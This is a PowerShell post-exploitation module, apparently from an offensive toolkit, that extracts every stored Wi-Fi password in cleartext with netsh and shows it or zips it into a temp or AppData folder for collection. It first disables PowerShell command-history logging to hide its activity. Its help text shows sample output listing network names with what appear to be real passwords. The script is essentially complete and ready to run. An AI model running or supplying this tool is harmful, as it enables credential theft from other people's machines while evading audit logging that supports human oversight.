<#
.SYNOPSIS
   Dump All SSID Wifi passwords

   Author: r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.1

.DESCRIPTION
   Module to dump SSID Wifi passwords into terminal windows
   OR dump credentials into a zip archive under `$Env:TMP

.NOTES
   Required Dependencies: netsh {native}

.Parameter WifiPasswords
   Accepts arguments: Dump and ZipDump

.Parameter Storage
   Accepts the absoluct \ relative path where to store capture

.EXAMPLE
   PS C:\> Get-Help .\WifiPasswords.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\WifiPasswords.ps1 -WifiPasswords Dump
   Dump ALL Wifi Passwords on this terminal prompt

.EXAMPLE
   PS C:\> .\WifiPasswords.ps1 -WifiPasswords ZipDump
   Dump Wifi Paswords into a Zip archive on %TMP% {default}

.EXAMPLE
   PS C:\> .\WifiPasswords.ps1 -WifiPasswords ZipDump -Storage `$Env:APPDATA
   Dump Wifi Paswords into a Zip archive on %APPDATA% remote directory

.OUTPUTS
   SSID name               Password    
   ---------               --------               
   CampingMilfontesWifi    Milfontes19 
   NOS_Internet_Movel_202E 37067757                                             
   Ondarest                381885C874           
   MEO-968328              310E0CBA14
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$WifiPasswords="false",
   [string]$Storage="$Env:TMP"
)


Write-Host ""
$Working_Directory = pwd|Select-Object -ExpandProperty Path
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$FileName = "SSIDump.zip" ## Default Zip Archive Name
If($WifiPasswords -ieq "Dump" -or $WifiPasswords -ieq "ZipDump"){

    If($WifiPasswords -ieq "Dump"){## Capture wifi interface passwords

        ## Display SSID Wifi passwords dump into terminal windows
        $profiles = netsh wlan show profiles|findstr /C:"All User Profile"
        $DataParse = $profiles -replace 'All User Profile     :','' -replace ' ',''

        ## Create Data Table for output
        $mytable = new-object System.Data.DataTable
        $mytable.Columns.Add("SSID name") | Out-Null
        $mytable.Columns.Add("Password") | Out-Null

        ForEach($Token in $DataParse){
            $DataToken = netsh wlan show profile name="$Token" key=clear|findstr /C:"Key Content"
            $Key = $DataToken -replace 'Key Content            : ','' -replace ' ',''
            ## Put results in the data table   
            $mytable.Rows.Add("$Token",
                              "$Key") | Out-Null
        }

        ## Display Table
        $mytable|Format-Table -AutoSize

    }ElseIf($WifiPasswords -ieq "ZipDump"){

        ## Dump SSID Wifi profiles passwords into a zip file
        If(-not(Test-Path "$Storage\SSIDump")){## Create Zip Folder
            New-Item "$Storage\SSIDump" -ItemType Directory -Force
        }

        cd $Storage\SSIDump;netsh wlan export profile folder=$Storage\SSIDump key=clear|Out-Null
        Compress-Archive -Path "$Storage\SSIDump" -DestinationPath "$Storage\$FileName" -Update
        Write-Host "`n`n[+] SSID Dump: $Storage\$FileName" -ForeGroundColor Yellow
        cd $Working_Directory ## Return to @MyMeterpreter Working Directory
    }
    ## Clean Old Dump Folder
    If(Test-Path "$Storage\SSIDump"){Remove-Item "$Storage\SSIDump" -Recurse -Force}
}